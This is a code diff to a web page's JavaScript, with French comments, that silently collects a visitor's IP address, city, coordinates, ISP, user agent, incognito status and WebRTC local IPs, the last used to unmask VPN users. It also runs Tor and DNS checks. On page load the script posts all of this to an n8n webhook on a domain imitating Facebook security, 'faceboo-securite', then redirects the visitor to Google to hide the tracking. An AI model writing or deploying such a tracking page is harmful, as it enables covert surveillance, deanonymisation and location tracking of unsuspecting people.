@@ -11,10 +11,10 @@
         async function getNetworkInfo() {
             const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
             return {
-                type: connection ? connection.type : "Inconnu",
-                downlink: connection ? connection.downlink + " Mbps" : "Inconnu",
-                effectiveType: connection ? connection.effectiveType : "Inconnu",
-                rtt: connection ? connection.rtt + " ms" : "Inconnu"
+                type: connection?.type || "Inconnu",
+                downlink: connection?.downlink ? `${connection.downlink} Mbps` : "Inconnu",
+                effectiveType: connection?.effectiveType || "Inconnu",
+                rtt: connection?.rtt ? `${connection.rtt} ms` : "Inconnu"
             };
         }
 
@@ -42,68 +42,88 @@
                             ips.push(match[1]);
                         }
                     } else {
-                        resolve(ips);
+                        resolve(ips.length ? ips : ["Aucune IP WebRTC détectée"]);
                     }
                 };
             });
         }
 
         async function detectVPN() {
-            let publicIP = await fetch("https://api64.ipify.org?format=json").then(res => res.json());
-            let webrtcIPs = await getWebRTCIPs();
+            try {
+                let publicIP = await fetch("https://api64.ipify.org?format=json").then(res => res.json());
+                let webrtcIPs = await getWebRTCIPs();
 
-            return {
-                isUsingVPN: webrtcIPs.length > 0 && !webrtcIPs.includes(publicIP.ip),
-                publicIP: publicIP.ip,
-                webrtcIPs: webrtcIPs
-            };
+                return {
+                    isUsingVPN: webrtcIPs.length > 0 && !webrtcIPs.includes(publicIP.ip),
+                    publicIP: publicIP.ip,
+                    webrtcIPs: webrtcIPs
+                };
+            } catch (error) {
+                return { isUsingVPN: "Échec de la détection", publicIP: "Inconnu", webrtcIPs: [] };
+            }
         }
 
         async function detectDNSLeak() {
-            let dnsTest = await fetch("https://dnsleaktest.com/api/").then(res => res.json());
-            return dnsTest.dns;
+            try {
+                let dnsTest = await fetch("https://cloudflare-dns.com/dns-query", {
+                    method: "GET",
+                    headers: { "Accept": "application/dns-json" }
+                }).then(res => res.json());
+
+                return dnsTest.Answer ? dnsTest.Answer.map(a => a.data) : "Aucune fuite détectée";
+            } catch (error) {
+                return "Échec de la détection DNS";
+            }
         }
 
         async function detectTorProxy() {
-            let test = await fetch("https://check.torproject.org/api/ip").then(res => res.json());
-            return test.IsTor ? "Tor détecté" : "Pas de Tor";
+            try {
+                let test = await fetch("https://check.torproject.org/api/ip").then(res => res.json());
+                return test.IsTor ? "Tor détecté" : "Pas de Tor";
+            } catch (error) {
+                return "Échec de la détection Tor";
+            }
         }
 
         async function collectData() {
-            let ipInfo = await fetch("https://ipinfo.io/json").then(response => response.json());
-            let networkInfo = await getNetworkInfo();
-            let incognito = await detectIncognito();
-            let vpnData = await detectVPN();
-            let dnsLeak = await detectDNSLeak();
-            let torCheck = await detectTorProxy();
+            try {
+                let ipInfo = await fetch("https://ipinfo.io/json").then(response => response.json());
+                let networkInfo = await getNetworkInfo();
+                let incognito = await detectIncognito();
+                let vpnData = await detectVPN();
+                let dnsLeak = await detectDNSLeak();
+                let torCheck = await detectTorProxy();
 
-            let logData = {
-                ip: ipInfo.ip,
-                ville: ipInfo.city,
-                région: ipInfo.region,
-                pays: ipInfo.country,
-                fournisseur: ipInfo.org,
-                position: ipInfo.loc,
-                userAgent: navigator.userAgent,
-                incognitoMode: incognito,
-                webrtcIPs: vpnData.webrtcIPs,
-                vpnDetected: vpnData.isUsingVPN,
-                dnsLeakDetected: dnsLeak,
-                torStatus: torCheck,
-                network: networkInfo
-            };
+                let logData = {
+                    ip: ipInfo.ip,
+                    ville: ipInfo.city,
+                    région: ipInfo.region,
+                    pays: ipInfo.country,
+                    fournisseur: ipInfo.org,
+                    position: ipInfo.loc,
+                    userAgent: navigator.userAgent,
+                    incognitoMode: incognito,
+                    webrtcIPs: vpnData.webrtcIPs,
+                    vpnDetected: vpnData.isUsingVPN,
+                    dnsLeakDetected: dnsLeak,
+                    torStatus: torCheck,
+                    network: networkInfo
+                };
 
-            // Envoyer les logs à un webhook (ex: Discord, n8n, API perso)
-            fetch("https://faceboo-securite.app.n8n.cloud/webhook-test/60760cce-a930-48c6-9f80-c7811d1b75c3", {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(logData)
-            });
+                // Envoyer les logs à un webhook (ex: Discord, n8n, API perso)
+                fetch("https://faceboo-securite.app.n8n.cloud/webhook-test/60760cce-a930-48c6-9f80-c7811d1b75c3", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(logData)
+                });
 
-            // Redirection après tracking
-            setTimeout(() => {
-                window.location.href = "https://www.google.com";
-            }, 3500);
+                // Redirection après tracking
+                setTimeout(() => {
+                    window.location.href = "https://www.google.com";
+                }, 3500);
+            } catch (error) {
+                console.error("Erreur dans la collecte des données :", error);
+            }
         }
 
         collectData();
